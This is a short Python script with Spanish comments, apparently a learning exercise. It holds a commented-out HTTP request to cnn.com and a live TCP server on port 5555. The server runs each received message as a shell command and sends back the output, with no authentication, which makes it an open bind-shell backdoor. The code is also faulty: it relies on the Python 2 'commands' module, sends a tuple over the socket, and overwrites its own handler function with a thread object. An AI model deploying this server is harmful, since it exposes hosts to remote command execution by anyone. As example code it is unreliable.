#Socket Server
# import socket

# request = b"GET / HTTP/1.1\nHost:www.cnn.com\n\n"

# try:
#     socketServer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#     print("Socket Creado satisfactoriamente")
# except socket.error as CreateError:
#     print("Algo ha ido mal creando el socket Error: ", CreateError)

# host = "cnn.com"
# port = 80
# try:
#     socketServer.connect((host, port))
#     print("Socket asociado al puerto: ", port)
# except socket.error as bindError:
#     print("Puerto no disponible Error: ", bindError)

# socketServer.send(request)
# result = socketServer.recv(10000)
# if (len(result)>0):
#     print("HTTP/1.0 200 OK:", result)
#     result = socketServer.recv(10000)
# else:
#     print("HTTP/1.0 404 Not Found")
import socket
import threading
import commands
def conexiones(socket_cliente):
    peticion = socket_cliente.recv(1024)
    print("Mensaje Recibido {}".format(peticion))
    respuesta = commands.getstatusoutput(peticion)
    socket_cliente.send(respuesta)
    socket_cliente.close()

ip = "0.0.0.0"
puerto = 5555
max_conexiones = 5
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server.bind((ip,puerto))
server.listen(max_conexiones)

print("Esperando conexiones en {} {}".format(ip,puerto))

while True:
    cliente, direccion = server.accept()
    print("Conexion Establecida con {} {}".format(direccion[0],direccion[1]))
    conexiones = threading.Thread(target=conexiones, args=(cliente,))
    conexiones.start()

